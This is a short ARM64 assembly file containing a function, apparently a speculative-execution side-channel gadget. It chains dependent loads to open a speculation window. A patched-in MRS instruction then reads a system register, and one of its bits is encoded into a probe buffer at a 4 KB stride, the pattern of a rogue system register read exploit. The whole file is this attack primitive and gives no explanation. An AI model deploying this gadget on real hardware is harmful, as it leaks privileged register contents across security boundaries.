// void spec_read(void *probe_buf, void *miss_buf, int bit);
.global spec_read
.func
spec_read:
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  NOP // replaced with MRS X3, SYSTEM_REG
  LSR X3, X3, X2
  AND X3, X3, #1
  ADD X0, X0, X3, LSL #12
  LDR X0, [X0]

  RET
.endfunc
